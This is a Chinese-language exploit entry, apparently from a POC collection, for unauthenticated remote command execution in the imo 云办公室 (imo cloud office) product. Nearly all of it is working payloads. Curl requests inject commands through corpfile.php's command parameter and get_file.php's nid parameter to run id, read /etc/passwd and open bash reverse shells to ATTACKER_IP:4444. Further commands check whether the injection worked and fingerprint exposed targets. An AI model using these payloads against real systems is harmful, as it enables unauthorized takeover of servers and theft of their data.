---
id: IMO-MULTI-RCE
title: imo 云办公室多接口远程命令执行漏洞
product: imo
vendor: imo
version_affected: "imo 云办公室"
severity: CRITICAL
tags: [rce, command_injection, 无需认证, 国产]
fingerprint: ["iMO", "imo", "云办公室"]
---

## 漏洞描述

imo 云办公室存在多个远程命令执行漏洞。`corpfile.php` 的 `command` 参数直接传入 `exec()` 函数执行；`get_file.php` 的 `nid` 参数被拼接到 `exec("ls ...")` 中，均可注入任意命令。

## 影响版本

- imo 云办公室

## 前置条件

- 无需认证

## 利用步骤

1. 通过 corpfile.php 的 command 参数直接执行命令
2. 或通过 get_file.php 的 nid 参数注入命令

## Payload

### 方式一：corpfile.php 直接命令执行

```bash
curl -s "http://target/corpfile.php" \
  -d "type=corpLogo&command=id&file=test"
```

### corpfile.php 反弹 Shell

```bash
curl -s "http://target/corpfile.php" \
  -d "type=corpLogo&command=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1&file=test"
```

### 方式二：get_file.php 命令注入

```bash
curl -s "http://target/file/NDisk/get_file.php?cid=1&nid=;id;"
curl -s "http://target/file/NDisk/get_file.php?cid=1&nid=;cat+/etc/passwd;"
```

### get_file.php 反弹 Shell

```bash
curl -s "http://target/file/NDisk/get_file.php?cid=1&nid=;bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261;"
```

## 验证方法

```bash
# corpfile.php
curl -s "http://target/corpfile.php" -d "type=corpLogo&command=id&file=test" | grep "uid="

# get_file.php
curl -s "http://target/file/NDisk/get_file.php?cid=1&nid=;id;" | grep "uid="
```

## 指纹确认

```bash
curl -s "http://target/" | grep -i "imo\|云办公室"
```
